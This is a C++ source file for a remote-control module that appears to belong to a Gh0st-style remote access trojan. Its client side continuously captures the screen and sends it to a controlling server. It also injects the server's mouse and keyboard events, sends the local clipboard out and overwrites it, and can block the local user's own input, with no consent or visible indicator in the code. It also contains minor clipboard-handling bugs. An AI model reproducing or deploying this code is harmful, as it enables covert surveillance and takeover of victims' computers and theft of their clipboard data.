#include "RemoteControl.h"



CRemoteControl::CRemoteControl(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	m_IsLoop = TRUE;
	m_IsBlockInput = FALSE;
	m_ScreenSpyObject = new CScreenSpy(16);
	m_ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendProcedure, this, 0, NULL);
	
}


CRemoteControl::~CRemoteControl()
{
	m_IsLoop = FALSE;
	WaitForSingleObject(m_ThreadHandle, INFINITE);
	if (m_ThreadHandle != NULL)
	{
		CloseHandle(m_ThreadHandle);
	}
	delete m_ScreenSpyObject;
	m_ScreenSpyObject = NULL;
	printf("~CRemoteControl()\r\n");
}
void  CRemoteControl::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	BYTE  IsToken;
	switch (BufferData[0])
	{
	case  CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	case  CLIENT_REMOTE_CONTROL_CONTROL_REQUIRE:
	{
		//锁定状态放开
		BlockInput(FALSE);
		AnalyzeCommand(BufferData + 1, BufferLength - 1);
		BlockInput(m_IsBlockInput);
		break;
	}
	case  CLIENT_REMOTE_CONTROL_BLOCK_INPUT:
	{
		m_IsBlockInput = *(LPBYTE)&BufferData[1];
		BlockInput(m_IsBlockInput);
		break;
	}
	case  CLIENT_REMOTE_CONTROL_GET_CLIPBOARD_REQUIRE:
	{
		SendClipboard();
		break;
	}
	case  CLIENT_REMOTE_CONTROL_SET_CLIPBOARD_REQUIRE:
	{
		SetClipboard((char*)BufferData + 1, BufferLength - 1);
		break;
	}
	}
}
DWORD   CRemoteControl::SendProcedure(LPVOID  ParameterData)
{
	CRemoteControl* This = (CRemoteControl*)ParameterData;
	This->SendBitmapInfo();
	//阻塞，等待服务器回传消息
	This->WaitingForServerDlgOpen();
	//第一帧桌面数据
	This->SendFirstScreenData();
	while (This->m_IsLoop)
	{
		//循环发送桌面数据
		This->SendNextScreenData();
		Sleep(10);
	}
	printf(" CRemoteControl::SendProcedure()退出\r\n");
	return 0;
}
VOID  CRemoteControl::SendBitmapInfo()
{
	//得到bmp结构的大小
	ULONG  BufferLength = 1 + m_ScreenSpyObject->GetBitmapInfoSize();           //大小
	LPBYTE  BufferData = (LPBYTE)VirtualAlloc(NULL, BufferLength, MEM_COMMIT, PAGE_READWRITE);
	BufferData[0] = CLIENT_REMOTE_CONTROL_REPLY;
	//这里将bmp位图结构发送出去
	memcpy(BufferData + 1, m_ScreenSpyObject->GetBitmapInfoData(), BufferLength - 1);
	m_IOCPClient->OnSending((char*)BufferData, BufferLength);
	VirtualFree(BufferData, 0, MEM_RELEASE);
}
VOID  CRemoteControl::SendFirstScreenData()
{
	BOOL  IsOk = FALSE;
	LPVOID  BitmapData = NULL;
	BitmapData = m_ScreenSpyObject->GetFirstScreenData();
	if (BitmapData == NULL)
	{
		return;
	}
	ULONG  BufferLength = 1 + m_ScreenSpyObject->GetFirstScreenSize();
	LPBYTE  BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}
	BufferData[0] = CLIENT_REMOTE_CONTROL_FIRST_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);
	m_IOCPClient->OnSending((char*)BufferData, BufferLength);
	delete[]  BufferData;
	BufferData = NULL;
}
VOID  CRemoteControl::SendNextScreenData()
{
	LPVOID  BitmapData = NULL;
	ULONG   BufferLength = 0;
	BitmapData = m_ScreenSpyObject->GetNextScreenData(&BufferLength);
	if (BitmapData == NULL||BufferLength == 0)
	{
		return;
	}
	//包含数据包的头部
	BufferLength += 1;
	LPBYTE  BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}
	BufferData[0] = CLIENT_REMOTE_CONTROL_NEXT_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);
	m_IOCPClient->OnSending((char*)BufferData, BufferLength);
	delete[]  BufferData;
	BufferData = NULL;
}
VOID  CRemoteControl::AnalyzeCommand(LPBYTE  BufferData, ULONG BufferLength)
{
	//数据包不合法
	if (BufferLength % sizeof(MSG) != 0)
	{
		return;
	}
	//命令个数
	ULONG  MsgCount = BufferLength / sizeof(MSG);
	//处理多个命令
	for(int i = 0;i<MsgCount;i++)
	{
		MSG*  Msg = (MSG*)(BufferData + i * sizeof(MSG));
		switch (Msg->message)
		{
		case  WM_LBUTTONDOWN:
		case  WM_LBUTTONUP:
		case  WM_RBUTTONDOWN:
		case  WM_RBUTTONUP:
		case  WM_MOUSEMOVE:
		case  WM_LBUTTONDBLCLK:
		case  WM_RBUTTONDBLCLK:
		case  WM_MBUTTONDOWN:
		case  WM_MBUTTONUP:
		{
			POINT  Point;
			Point.x = LOWORD(Msg->lParam);
			Point.y = HIWORD(Msg->lParam);
			SetCursorPos(Point.x, Point.y);
			DWORD  LastError = GetLastError();
			SetCapture(WindowFromPoint(Point));
			LastError = GetLastError();
		}
		break;
		default:
			break;
		}
		switch (Msg->message)
		{
		case  WM_LBUTTONDOWN:
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		}
		case  WM_LBUTTONUP:
		{
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		}
		case  WM_RBUTTONDOWN:
		{
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		}
		case  WM_RBUTTONUP:
		{
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		}
		case  WM_LBUTTONDBLCLK:
		{
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		}
		case  WM_RBUTTONDBLCLK:
		{
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		}
		case  WM_MBUTTONDOWN:
		{
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		}
		case  WM_MBUTTONUP:
		{
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		}
		case  WM_MOUSEWHEEL:
		{
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
			break;
		}
		case  WM_KEYDOWN:
		case  WM_SYSKEYDOWN:
		{
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		}
		case  WM_KEYUP:
		case  WM_SYSKEYUP:
		{
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		}
		default:
			break;
		}
	}
	

}
VOID  CRemoteControl::SendClipboard()
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}
	HGLOBAL  GlobalHandle = GetClipboardData(CF_TEXT);
	if (GlobalHandle == NULL)
	{
		CloseClipboard();
		return;
	}
	int BufferLength = GlobalSize(GlobalHandle) + 1;
	char*  v5 = (LPSTR)GlobalLock(GlobalHandle);
	LPBYTE  BufferData = new  BYTE[BufferLength];

	BufferData[0] = CLIENT_REMOTE_CONTROL_SET_CLIPBOARD_REQUIRE;
	memcpy(BufferData + 1, v5, BufferLength - 1);
	::GlobalUnlock(GlobalHandle);
	::CloseClipboard();
	m_IOCPClient->OnSending((char*)BufferData, BufferLength);
	delete[]  BufferData;
}
VOID   CRemoteControl::SetClipboard(char* BufferData, ULONG  BufferLength)
{
	if (!::OpenClipboard(NULL))
	{
		return;
	}
	//清空剪贴板内容
	::EmptyClipboard();
	HGLOBAL  GlobalHandle = GlobalAlloc(GPTR, BufferLength);
	if (GlobalHandle != NULL)
	{
		char*  ClipboardVirtualAddress = (LPTSTR)GlobalLock(GlobalHandle);
		memcpy(ClipboardVirtualAddress, BufferData, BufferLength);
		GlobalUnlock(GlobalHandle);
		SetClipboardData(CF_TEXT, GlobalHandle);
		GlobalFree(GlobalHandle);
	}
	CloseClipboard();
}
